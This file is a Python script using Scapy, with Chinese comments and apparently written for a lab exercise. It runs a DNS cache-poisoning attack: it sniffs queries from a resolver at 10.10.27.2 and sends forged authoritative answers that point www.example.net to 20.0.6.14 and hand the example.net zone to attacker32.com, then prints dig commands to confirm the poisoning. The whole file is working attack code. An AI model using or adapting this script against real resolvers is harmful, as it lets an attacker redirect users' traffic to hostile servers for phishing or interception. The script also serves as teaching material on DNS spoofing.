from scapy.all import *
import time

def spoof_dns(pkt):
    # 打印收到的包信息用于调试
    print(f"Received DNS query from {pkt[IP].src} for {pkt[DNS].qd.qname}")
    
    # 处理 www.example.net 的A记录查询
    if DNS in pkt and b'www.example.net' in pkt[DNS].qd.qname and pkt[DNS].qd.qtype == 1:
        print("Spoofing A record response for www.example.net...")
        
        # 构造IP层
        IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)
        
        # 构造UDP层
        UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)
        
        # Answer Section - www.example.net A 20.0.6.14
        Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='A', ttl=259200, rdata='20.0.6.14')
        
        # Authority Section - example.net NS attacker32.com
        NSsec = DNSRR(rrname='example.net', type='NS', ttl=259200, rdata='attacker32.com')
        
        # Additional Section - attacker32.com A 20.0.8.27
        Addsec = DNSRR(rrname='attacker32.com', type='A', ttl=259200, rdata='20.0.8.27')
        
        # 构造DNS包
        DNSpkt = DNS(
            id=pkt[DNS].id,
            qd=pkt[DNS].qd,
            aa=1,  # 权威回答
            rd=0,  # 递归禁用
            qr=1,  # 响应
            qdcount=1,
            ancount=1,
            nscount=1,
            arcount=1,
            an=Anssec,
            ns=NSsec,
            ar=Addsec
        )
        
        # 发送伪造的响应包
        spoofpkt = IPpkt/UDPpkt/DNSpkt
        send(spoofpkt, verbose=0)
        print("A record spoofed packet sent!")
        return True
    
    # 处理 example.net 的NS记录查询
    elif DNS in pkt and b'example.net' in pkt[DNS].qd.qname and pkt[DNS].qd.qtype == 2:
        print("Spoofing NS record response for example.net...")
        
        # 构造IP层
        IPpkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)
        
        # 构造UDP层
        UDPpkt = UDP(dport=pkt[UDP].sport, sport=53)
        
        # Answer Section - example.net NS attacker32.com
        Anssec = DNSRR(rrname=pkt[DNS].qd.qname, type='NS', ttl=259200, rdata='attacker32.com')
        
        # Additional Section - attacker32.com A 20.0.8.27
        Addsec = DNSRR(rrname='attacker32.com', type='A', ttl=259200, rdata='20.0.8.27')
        
        # 构造DNS包
        DNSpkt = DNS(
            id=pkt[DNS].id,
            qd=pkt[DNS].qd,
            aa=1,  # 权威回答
            rd=0,  # 递归禁用
            qr=1,  # 响应
            qdcount=1,
            ancount=1,
            nscount=0,  # NS记录在Answer段
            arcount=1,
            an=Anssec,
            ar=Addsec
        )
        
        # 发送伪造的响应包
        spoofpkt = IPpkt/UDPpkt/DNSpkt
        send(spoofpkt, verbose=0)
        print("NS record spoofed packet sent!")
        return True

# 开始嗅探
print("Starting DNS cache poisoning attack...")
print("Listening for DNS queries...")

try:
    # 嗅探DNS查询
    sniff(
        filter='udp and port 53 and src host 10.10.27.2',
        prn=spoof_dns,
        iface="br-35bfec57ccd3",
        count=20,  # 处理多个查询
        timeout=60
    )
    
    print("Attack completed. Please verify with:")
    print("dig www.example.net @10.10.27.2")
    print("dig example.net NS @10.10.27.2")
    print("dig attacker32.com A @10.10.27.2")
    
except Exception as e:
    print(f"Error: {e}")